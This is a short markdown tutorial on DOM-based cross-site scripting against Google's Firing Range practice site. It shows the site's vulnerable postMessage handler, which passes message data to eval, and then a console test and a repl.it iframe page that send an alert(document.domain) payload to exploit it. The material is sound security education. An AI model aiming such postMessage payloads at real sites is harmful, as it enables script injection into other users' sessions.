# AN IDEA ON [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting)

in addition to the following [l1ackerone](https://www.hackerone.com/) YouTube Video:

[Hacker101 - JavaScript for Hackers (Created by @STÖK)](https://www.youtube.com/watch?v=FTeE3OrTNoA)

[Hacker0x01](https://github.com/Hacker0x01/hacker101) <- I didn't check if there's an repo already, the answer is yes. LMAO

Google has a website called [Firing Range](https://public-firing-range.appspot.com/dom/) with some cool vulnerabilities you can just shoot at, to explore what happens.

Example:
- [PostMessage - complex message](https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval)

```html
<html>
  <head><title>Toxic DOM</title></head>
  <body>
    <script>
      const postMessageHandler = function(msg) {
  let action = msg.data.action;
  if(action === 'exec') {
    eval(msg.data.payload);
  } else if (action === 'addImage') {
    document.write('<img href='+ msg.data.source + '>');
  } else if (action === 'addHtml') {
    document.write(msg.data.html);
  } else {
    console.debug('unsupported command');
  }
};

window.addEventListener('message', postMessageHandler, false);

    </script>
  </body>
</html>
```
# Let's open console-devtools
Try some stuff: ,,Oh we could exec some post-scripts, nice!"
```
[Nano] Nano Defender Activated :: public-firing-range.appspot.com
VM81:15 [Nano] Read-only Property :: window.canRunAds
VM82:15 [Nano] Read-only Property :: window.canShowAds
VM83:15 [Nano] Read-only Property :: window.isAdBlockActive
alert('test')
undefined
window-Infinity
NaN
window.postMessage({"action":"exec","payload":"alert(document.domain)"},'*')
undefined
```

# [repl.it](https://repl.it/) is awesome, and...
..will be our temp host for testing now

Just hit **<> start coding** and choose `HTML, CSS, JS`
## Let's insert an `iframe` into our html

index.html
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>repl.it</title>
    <link href="style.css" rel="stylesheet" type="text/css" />
  </head>
  <body>


    <iframe id=target></iframe>


    <script src="script.js"></script>
  </body>
</html>
```
## Write some JS
Now that we know theres a vurlnability, just use the one we tested in console earlier 
> `window.postMessage({"action":"exec","payload":"alert(document.domain)"},'*'`
and target the already mentioned site 


script.js
```javascript
var target = document.getElementById('target')

target.addEventListener('load',()=>{

  target.contentWindow.postMessage({"action":"exec","payload":"alert(document.domain)"},'*')
})

target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval"
```
# Alert will popup, congratulations!
 An embbeded page at public-firing-range.appspot.com says
public -firing-range.appspot.com
